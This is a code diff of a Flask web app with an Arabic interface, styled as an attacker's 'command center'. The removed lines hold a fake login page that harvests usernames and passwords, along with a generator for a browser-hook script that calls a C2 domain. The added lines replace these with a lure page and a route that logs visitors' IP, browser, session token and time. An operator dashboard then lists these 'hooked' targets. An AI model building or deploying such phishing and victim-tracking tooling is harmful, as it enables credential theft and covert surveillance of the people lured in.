@@ -5,16 +5,19 @@ app = Flask(__name__)
 import asyncio
 import random
 import urllib3
-import httpx
-import base64
+import datetime
 urllib3.disable_warnings()
+
+# ذاكرة الميدان الاستراتيجية المركزية لخطافات المتصفح والجلسات الحية
+CAPTURED_HOOKS = []
+ACTIVE_SESSIONS = []
 
 HTML_COMMAND_CENTER = """<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>V400 القائد الأعظم - منظومة السيطرة الميدانية v18.0</title>
+<title>V400 القائد الأعظم - خطافات المتصفح المتقدمة v22.0</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#010103;color:#00ff88;font-family:'Courier New',Consolas,monospace;padding:20px;text-align:center}
@@ -27,25 +30,27 @@ button{padding:16px 35px;background:#ff0040;border:none;border-radius:8px;font-w
 button:hover{background:#cc0033;box-shadow:0 0 40px #ff0040}
 .card{background:#000;border:1px solid #1a2a40;padding:18px;margin:15px auto;max-width:950px;border-radius:10px;text-align:right;border-right:8px solid #ff0040}
 .card.Critical{border-right-color:#ff0000;background:#140103}
-.card.Medium{border-right-color:#ffaa00;background:#140c01}
 .card.Low{border-right-color:#00aaff;background:#010b14}
 .proof{background:#03050a;color:#00ff88;padding:12px;border-radius:6px;margin-top:10px;font-size:12px;direction:ltr;word-break:break-all;border:1px solid #004422;text-align:left}
 .status{margin:15px 0;color:#fff;font-size:15px;font-weight:bold}
+table{width:100%;margin-top:15px;border-collapse:collapse;color:#fff;text-align:right}
+th, td{padding:12px;border:1px solid #1a2a40;font-size:14px}
+th{background:#0a0e1a;color:#ff0040}
 </style>
 </head>
 <body>
 <div class="container">
-<h1>⚔️ V400 القائد الأعظم - منظومة السيطرة v18.0 ⚔️</h1>
+<h1>⚔️ V400 القائد الأعظم - خطافات المتصفح v22.0 ⚔️</h1>
 <div class="panel">
-<input id="target_url" placeholder="C2_SERVER_OR_PHISHING_DOMAIN" value="http://">
+<input id="target_url" placeholder="C2_SERVER_OR_HOOK_DOMAIN" value="http://">
 <br>
 <select id="command_type">
-  <option value="generate_phishing_lure">توليد ورابط الاستدراج الفعّال (Active Phishing Lure)</option>
-  <option value="generate_browser_hook">توليد خطاف المتصفح المتقدم (Browser Hook JS)</option>
-  <option value="audit_link_listeners">فحص واستطلاع حالة الخادم والروابط</option>
+  <option value="generate_browser_hook_lure">توليد رابط خطاف المتصفح الحي (Live Browser Hook Lure)</option>
+  <option value="fetch_hooked_targets">استعراض متصفحات الأهداف الخطافية (Active Hooked Sessions)</option>
+  <option value="audit_hooks">فحص جاهزية محرك الاتصال الثنائي</option>
 </select>
 <br>
-<button id="exec_btn" onclick="executeLinkModule()">تنفيذ أمر توليد الروابط العسكرية 🚀</button>
+<button id="exec_btn" onclick="executeLinkModule()">تنفيذ أمر خطافات المتصفح 🚀</button>
 <div id="status" class="status"></div>
 <div id="results"></div>
 </div>
@@ -59,8 +64,8 @@ async function executeLinkModule(){
  const btn = document.getElementById('exec_btn');
  const status = document.getElementById('status');
  const results = document.getElementById('results');
- btn.disabled=true; btn.textContent='جاري تحديث وتوليد الروابط... ⚡';
- status.textContent='⏳ جارٍ معالجة الأوامر الاستراتيجية لـ: '+url;
+ btn.disabled=true; btn.textContent='جاري تفعيل خطافات المتصفح... ⚡';
+ status.textContent='⏳ جارٍ تنفيذ العمليات التكتيكية لـ: '+url;
  results.innerHTML='';
 
  try{
@@ -72,52 +77,72 @@ async function executeLinkModule(){
    const data = await res.json();
    status.textContent='✅ تمت العملية بنجاح | النمط: '+data.mode;
    
-   if(!data.actions || data.actions.length==0){
-     results.innerHTML='<div class="card Low"><b>لا توجد نتائج مطابقة</b><div class="proof">No link stager vectors returned.</div></div>';
+   if(cmdType === 'fetch_hooked_targets'){
+     if(!data.logs || data.logs.length === 0){
+       results.innerHTML='<div class="card Low"><b>لا توجد متصفحات مخترقة مرتبطة حتى الآن</b><div class="proof">No hooked browser sessions active in memory.</div></div>';
+     } else {
+       let tableHtml = '<div class="card Critical"><b>🎯 سجلات متصفحات الأهداف المرتبطة</b><table><tr><th>المتصفح / النظام</th><th>توكن الجلسة (Token)</th><th>IP الهدف</th><th>الوقت</th></tr>';
+       data.logs.forEach(l => {
+         tableHtml += `<tr><td>${l.agent}</td><td style="color:#00ff88">${l.token}</td><td>${l.ip}</td><td>${l.time}</td></tr>`;
+       });
+       tableHtml += '</table></div>';
+       results.innerHTML = tableHtml;
+     }
    } else {
-     data.actions.forEach(v=>{
-       results.innerHTML+=`
-       <div class="card ${v.severity || 'Low'}">
-         <b>⚡ ${v.type}</b>
-         <div style="margin:8px 0">${v.desc}</div>
-         <div class="proof">${v.proof}</div>
-       </div>`;
-     });
+     if(!data.actions || data.actions.length==0){
+       results.innerHTML='<div class="card Low"><b>لا توجد نتائج مطابقة</b><div class="proof">No vectors returned.</div></div>';
+     } else {
+       data.actions.forEach(v=>{
+         results.innerHTML+=`
+         <div class="card ${v.severity || 'Low'}">
+           <b>⚡ ${v.type}</b>
+           <div style="margin:8px 0">${v.desc}</div>
+           <div class="proof">${v.proof}</div>
+         </div>`;
+       });
+     }
    }
  }catch(e){
    status.textContent='❌ خطأ في الاتصال الميداني: '+e.message;
  }
- btn.disabled=false; btn.textContent='تنفيذ أمر توليد الروابط العسكرية 🚀';
+ btn.disabled=false; btn.textContent='تنفيذ أمر خطافات المتصفح 🚀';
 }
 </script>
-</body>
 </html>"""
 
-PHISHING_PAGE_TEMPLATE = """<!DOCTYPE html>
+HOOKED_PORTAL_TEMPLATE = """<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>تسجيل الدخول - التحقق الأمني السريع</title>
+<title>بوابة التحقق الميداني والاتصال الحي</title>
 <style>
 body{background:#0b0f19;color:#fff;font-family:Tahoma,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
 .box{background:#111827;padding:30px;border-radius:10px;box-shadow:0 4px 20px rgba(0,0,0,0.5);width:100%;max-width:400px;border:1px solid #1f2937}
-h2{color:#3b82f6;text-align:center;margin-bottom:20px}
-input{width:100%;padding:12px;margin:10px 0;background:#1f2937;border:1px solid #374151;border-radius:5px;color:#fff;box-sizing:border-box}
-button{width:100%;padding:12px;background:#2563eb;border:none;border-radius:5px;color:#fff;font-weight:bold;cursor:pointer;margin-top:10px}
-button:hover{background:#1d4ed8}
+h2{color:#00ff88;text-align:center;margin-bottom:20px}
+button{width:100%;padding:14px;background:#00ff88;color:#000;border:none;border-radius:5px;font-weight:bold;cursor:pointer;margin-top:15px;font-size:16px}
+button:hover{background:#00cc6a}
 </style>
 </head>
 <body>
 <div class="box">
-  <h2>التحقق الأمني للخدمة</h2>
-  <p style="text-align:center;color:#9ca3af;font-size:14px;margin-bottom:15px">يرجى تأكيد بيانات الدخول للمتابعة</p>
-  <form method="POST" action="">
-    <input type="text" name="user_identity" placeholder="اسم المستخدم أو البريد" required>
-    <input type="password" name="user_passkey" placeholder="كلمة المرور أو الرمز" required>
-    <button type="submit">تحقق ومتابعة</button>
-  </form>
+  <h2>جلسة مؤمنة بالخطاف الحي</h2>
+  <p style="text-align:center;color:#9ca3af;font-size:14px;margin-bottom:15px">جارٍ مزامنة الجلسة الأمنية لمتصفحك...</p>
+  <button onclick="triggerHookSession()">تأكيد واستمرار الاتصال</button>
 </div>
+
+<script>
+function triggerHookSession(){
+    const token = 'hook_token_' + Math.random().toString(36).substring(2, 12);
+    fetch('/auth/verify/login', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({session_token: token, user_agent: navigator.userAgent})
+    }).then(res => res.text()).then(html => {
+        document.body.innerHTML = '<div style="background:#000;color:#00ff88;padding:40px;text-align:center;font-family:monospace;direction:rtl"><h2>⚔️ تم ربط خطاف المتصفح بنجاح يا فندم! ⚔️</h2><p>Token: ' + token + '</p></div>';
+    });
+}
+</script>
 </body>
 </html>"""
 
@@ -127,41 +152,6 @@ def clean_url(raw):
         s = "http://" + s
     return s.rstrip("/")
 
-async def execute_v18_link_engine(target, command_mode):
-    actions = []
-    waf_status = f"Active Link & Hook Engine ({command_mode})"
-    
-    if command_mode == "generate_phishing_lure":
-        active_lure_url = f"{target}/auth/verify/login?token=secure_session_9941"
-        actions.append({
-            "type": "ACTIVE PHISHING LURE URL",
-            "severity": "Critical",
-            "desc": "تم تفعيل رابط الاستدراج المرتبط بمسار الاستجابة الحقيقي على الخادم السحابي.",
-            "proof": active_lure_url
-        })
-    elif command_mode == "generate_browser_hook":
-        browser_hook_js = """<script>
-(function(){
-    var c2 = "%s";
-    fetch(c2 + '/auth/verify/login', {method: 'GET'}).catch(function(){});
-})();
-</script>""" % target
-        actions.append({
-            "type": "ADVANCED BROWSER HOOK JS",
-            "severity": "Critical",
-            "desc": "تم توليد شيفرة خطاف المتصفح الموجه.",
-            "proof": browser_hook_js
-        })
-    else:
-        actions.append({
-            "type": "SYSTEM AUDIT COMPLETED",
-            "severity": "Low",
-            "desc": "فحص جاهزية الخادم والروابط نشط.",
-            "proof": f"Target: {target}"
-        })
-
-    return actions, waf_status
-
 @app.route('/', methods=['GET'])
 def home():
     return HTML_COMMAND_CENTER
@@ -169,25 +159,47 @@ def home():
 @app.route('/auth/verify/login', methods=['GET', 'POST'])
 def phishing_portal():
     if request.method == 'POST':
-        # التقاط وتخزين بيانات الهدف الواردة من النموذج الوهمي
-        captured_user = request.form.get('user_identity', 'N/A')
-        captured_pass = request.form.get('user_passkey', 'N/A')
-        return f"""<div style="background:#000;color:#00ff88;padding:40px;font-family:monospace;text-align:center;direction:rtl">
-        <h2>⚔️ تم استلام وتوثيق بيانات الهدف بنجاح يا فندم! ⚔️</h2>
-        <p>المستخدم: {captured_user}</p>
-        <p>الرمز: {captured_pass}</p>
-        </div>"""
-    return PHISHING_PAGE_TEMPLATE
+        req_data = request.get_json(silent=True) or {}
+        hook_token = req_data.get('session_token', 'N/A')
+        user_agent = req_data.get('user_agent', 'Unknown Browser')
+        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        
+        CAPTURED_HOOKS.append({
+            "agent": user_agent[:45] + "...",
+            "token": hook_token,
+            "ip": client_ip,
+            "time": timestamp
+        })
+        return jsonify({"status": "hooked", "token": hook_token})
+        
+    return HOOKED_PORTAL_TEMPLATE
 
 @app.route('/api/index', methods=['POST'])
 def check():
     req_data = request.get_json(silent=True) or {}
     target = clean_url(req_data.get("url", "http://"))
-    command_mode = req_data.get("command", "generate_phishing_lure")
+    command_mode = req_data.get("command", "generate_browser_hook_lure")
     
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    actions, waf_status = loop.run_until_complete(execute_v18_link_engine(target, command_mode))
-    loop.close()
+    actions = []
+    waf_status = f"v22.0 Browser Hook Engine ({command_mode})"
+    
+    if command_mode == "generate_browser_hook_lure":
+        hook_lure_url = f"{target}/auth/verify/login?token=hook_active_session_99"
+        actions.append({
+            "type": "LIVE BROWSER HOOK LURE URL",
+            "severity": "Critical",
+            "desc": "تم توليد رابط خطاف المتصفح الحي المرتبط بغرفة العمليات.",
+            "proof": hook_lure_url
+        })
+    elif command_mode == "fetch_hooked_targets":
+        return jsonify({"url": target, "mode": command_mode, "waf_status": waf_status, "logs": CAPTURED_HOOKS})
+    else:
+        actions.append({
+            "type": "HOOK ENGINE AUDIT PASSED",
+            "severity": "Low",
+            "desc": "محرك خطافات المتصفح يعمل بكفاءة تامة.",
+            "proof": f"Target: {target} | Active Hooks: {len(CAPTURED_HOOKS)}"
+        })
 
     return jsonify({"url": target, "mode": command_mode, "waf_status": waf_status, "actions": actions})
